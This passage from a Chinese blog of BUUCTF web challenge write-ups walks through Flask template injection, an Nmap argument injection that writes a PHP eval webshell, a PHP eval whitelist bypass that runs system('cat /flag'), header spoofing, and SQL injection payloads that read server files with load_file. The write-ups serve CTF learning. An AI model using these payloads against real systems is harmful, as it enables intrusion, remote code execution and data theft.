class="comment">#渲染函数,将处理后的shrine变量渲染到网页中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>SSTI</code>题注入点在URL中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d867c53e-04fe-4b35-ad90-7d68985784b5.node4.buuoj.cn:81/shrine/abc</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221021163526067-1667047819736141.png" alt="image-20221021163526067" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221021163626656-1667047819736140.png" alt="image-20221021163626656" style="zoom:67%;" /><p>目标是访问到<code>config</code>这个字典数组,其中的<code>config[&#39;FLAG&#39;]</code>存储了所需的值. </p><p><strong><code>join</code>的作用是将序列中的元素以指定元素连接</strong><br><strong><code>&quot;&#39;&#39;.join</code>就是通过空字符来连接,所以结果就是</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;% set config=None%&#125;&#125;&#123;&#123;% set config=None%&#125;&#125;+s  这里s是我们注入的内容</span><br></pre></td></tr></table></figure><p>所以这里是将<code>config</code>和<code>self</code>对象设置为了<code>none</code></p><p>如果没有这一步处理,直接通过:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[&#x27;FLAG&#x27;]&#125;&#125; 或者 &#123;&#123;config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure><p>就能够获得flag了,但是现在需要绕过对<code>config</code>的处理</p><p><strong>利用 <code>__globals__</code> 访问 <code>current_app</code>, 后者就是当前的<code>app</code>的映射, 自然就能访问到 <code>app.config</code></strong></p><p>然后是只有函数才有 <code>__globals__,</code>因此还需要使用函数来调用<code>__globals__</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><hr><br><h1 id="nmap写一句话木马到文件-Nmap"><a href="#nmap写一句话木马到文件-Nmap" class="headerlink" title="[nmap写一句话木马到文件]Nmap"></a>[nmap写一句话木马到文件]Nmap</h1><p>这里是将结果输出到了文件中,这里是通过<code>f</code>参数访问该文件返回结果</p><img src="/images/buuctf-web/image-20221021172809613-1667047819736142.png" alt="image-20221021172809613" style="zoom:67%;" /><p>这里再随便输入一段乱码让它扫描</p><img src="/images/buuctf-web/image-20221021172953371-1667047819736143.png" alt="image-20221021172953371" style="zoom:67%;" /><p>通过刚刚的参数访问这个文件:</p><img src="/images/buuctf-web/image-20221021173028913.png" alt="image-20221021173028913" style="zoom:80%;" /><p>感觉和前面的<code>Online Tool</code>那道题有点相似</p><p>那么尝试输入: 这里<code>-oG</code>是让<code>nmap</code>把结果输出到<code>a.php</code>中,其中会包含前面的这个一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[a])?&gt; -oG a.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php eval($_POST[a])?&gt; -oG a.php &#x27;</span><br></pre></td></tr></table></figure><p>尝试一句话木马的替代方案,最后感觉应该是过滤了<code>php</code>, 那么把<code>php</code>替换一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?=eval($_POST[a])?&gt; -oG b.phtml &#x27;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221021174112442.png" alt="image-20221021174112442" style="zoom:80%;" /><p>执行成功,使用蚁剑来连接: 根目录找到flag</p><img src="/images/buuctf-web/image-20221021174802503-1667047819736144.png" alt="image-20221021174802503" style="zoom:67%;" /><br><hr><br><h1 id="用数学函数构造命令执行-Love-Math"><a href="#用数学函数构造命令执行-Love-Math" class="headerlink" title="[用数学函数构造命令执行]Love Math"></a>[用数学函数构造命令执行]Love Math</h1><p>并不喜欢数学</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>]; <span class="comment">//黑名单过滤</span></span><br><span class="line">    <span class="comment">// 可用的还有: . / () * </span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="comment"># 匹配结果输入到$used_funcs,这里是匹配content中的所有字母数字等字符,然后去检验它们是否在whitelist中</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路一: 通过给定函数构造<code>_GET</code>,然后通过其他<code>GET</code>参数来执行不受过滤限制地执行命令</p><p><strong>可以通过<code>dex2hex</code>和<code>hex2bin</code>来构造<code>_GET</code>, 测试:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;_GET&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">bindec</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="comment">//输出: </span></span><br><span class="line"><span class="number">5</span>f474554</span><br><span class="line"><span class="number">1598506324</span></span><br><span class="line"><span class="comment">//所以,构造_GET的思路就是:</span></span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>))</span><br><span class="line"><span class="comment">//这里hex2bin函数需要构造,可以使用任意进制转换的base_convert()</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)   <span class="comment">//输出hex2bin</span></span><br><span class="line"><span class="comment">//所以:</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>)) <span class="comment">//输出_GET</span></span><br><span class="line"><span class="comment">//接下来在白名单里找一个比较短的函数,接触它的名字来做变量名:</span></span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));  <span class="comment">//这里$pi=_GET,所以$$pi就是$_GET</span></span><br><span class="line"><span class="comment">//$$pi&#123;0&#125;=$_GET&#123;0&#125;,$$pi&#123;1&#125;=$_GET&#123;1&#125;</span></span><br><span class="line"><span class="comment">//所以($$pi&#123;0&#125;)(($$pi&#123;1&#125;)) 就是$_GET&#123;0&#125;($_GET&#123;1&#125;)</span></span><br><span class="line"><span class="comment">//那么后面另外给这两个传参就行,它们是不受过滤限制的</span></span><br><span class="line"><span class="comment">//payload:</span></span><br><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;<span class="number">0</span>&#125;)((<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;))&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="XFF-PYWebsite"><a href="#XFF-PYWebsite" class="headerlink" title="[XFF]PYWebsite"></a>[XFF]PYWebsite</h1><p>网站源码中:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">      hash = <span class="title function_">hex_md5</span>(code);</span><br><span class="line">      <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;vcode&quot;</span>).<span class="property">value</span>;</span><br><span class="line">      <span class="keyword">if</span> (code != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">hex_md5</span>(code) == <span class="string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;</span><br><span class="line">          <span class="title function_">alert</span>(<span class="string">&quot;您通过了验证！&quot;</span>);</span><br><span class="line">          <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;./flag.php&quot;</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="title function_">alert</span>(<span class="string">&quot;你的授权码不正确！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请输入授权码&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>首先需要输入的授权码经过md5计算后等于上面那个值,然后页面就能够跳转到<code>./flag.php</code></p><p>先直接访问一下看看:</p><img src="/images/buuctf-web/image-20221022105012608-1667047819736145.png" alt="image-20221022105012608" style="zoom:67%;" /><p>这里说了他自己也能够看到<code>flag</code>,那么加一个XFF头欺骗一下试试</p><img src="/images/buuctf-web/image-20221022105308397-1667047819736147.png" alt="image-20221022105308397" style="zoom:67%;" /><br><hr><br><h1 id="无列名注入-Web1"><a href="#无列名注入-Web1" class="headerlink" title="[无列名注入]Web1"></a>[无列名注入]Web1</h1><p>先随便注册一个</p><img src="/images/buuctf-web/image-20221022112639465-1667047819736146.png" alt="image-20221022112639465" style="zoom:67%;" /><p>点击申请广告之后,输入的内容会直接显示在页面上,这里是<code>XSS</code>?</p><img src="/images/buuctf-web/image-20221022113045769-1667047819736148.png" alt="image-20221022113045769" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221022113033647-1667047819736149.png" alt="image-20221022113033647" style="zoom:67%;" /><p>试了半天<code>XSS</code>往里面写一句话木马什么也不管用</p><p>在广告申请页面输入尝试一下注入: 广告名和内容后面加一个引号试试</p><img src="/images/buuctf-web/image-20221022115204668-1667047819736150.png" alt="image-20221022115204668" style="zoom:67%;" /><p>结果点击广告详情的时候出现了SQL报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; limit 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>那这里应该是根据广告名来查询的其他信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#  这里报标题含有敏感词汇,存在过滤</span><br><span class="line">经过尝试 #,or,-被过滤</span><br><span class="line">1&#x27; union select 1,2;</span><br><span class="line">会自动去掉空格</span><br><span class="line">1&#x27;/**/union/**/select/**/1,2;</span><br><span class="line"></span><br><span class="line">这个:</span><br><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,&#x27;2     </span><br><span class="line">The used SELECT statements have a different number of columns</span><br><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>tnnd一直试到22才成功:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221022124629325-1667047819736151.png" alt="image-20221022124629325" style="zoom:67%;" /><p>2,3位置上的内容会回显</p><p>库名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,database(),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221022124739540-1667047819736152.png" alt="image-20221022124739540" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/group_concat(TABLE_NAME)/**/from/**/information_schema.TABLES/**/where/**/table_schema=&#x27;web1&#x27;),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里 因为<code>or</code>是过滤词,所以<code>information</code>会被过滤,要考虑别的办法了…</p><p><code>user</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,user(),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221022130403921-1667047819736153.png" alt="image-20221022130403921" style="zoom:67%;" /><p>这里执行查询的是<code>root</code>用户,所以还具有一些特殊权限,例如读取文件: 读取一下广告申请那个页面的源码,看看过滤逻辑:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,load_file(&#x27;/var/www/html/addads.php&#x27;),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;./config.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ac&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ac&#x27;</span>] === <span class="string">&#x27;add&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;number&#x27;</span>] &gt;= <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;font color=&#x27;red&#x27; size=&#x27;4&#x27;&gt;申请的广告条数已达上限，请先清理&lt;/font&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$title</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]));</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql_query</span> = <span class="string">&quot;select * from ads where title = &#x27;<span class="subst">$title</span>&#x27; limit 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql_insert</span> = <span class="string">&quot;insert into ads (title, content, belong) values (&#x27;<span class="subst">$title</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;&quot;</span>.<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/updatexml|extractvalue|floor|name_const|join|exp|geometrycollection|multipoint|polygon|multipolygon|linestring|multilinestring|#|--|or|and/i&quot;</span>, <span class="variable">$title</span>))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;font color=&#x27;red&#x27; size=&#x27;4&#x27;&gt;标题含有敏感词汇&lt;/font&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$result_query</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_query</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result_query</span>-&gt;num_rows)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;font color=&#x27;red&#x27; size=&#x27;4&#x27;&gt;广告名称已存在&lt;/font&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result_insert</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_insert</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result_insert</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;number&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;已发送申请&#x27;);window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;font color=&#x27;red&#x27; size=&#x27;4&#x27;&gt;申请失败&lt;/font&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面还是要想办法绕过对<code>information_schema.TABLES</code>的过滤</p><p><strong>使用<code>mysql.innodb_table_stats</code>来代替<code>information_schema.TABLES</code>查询表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 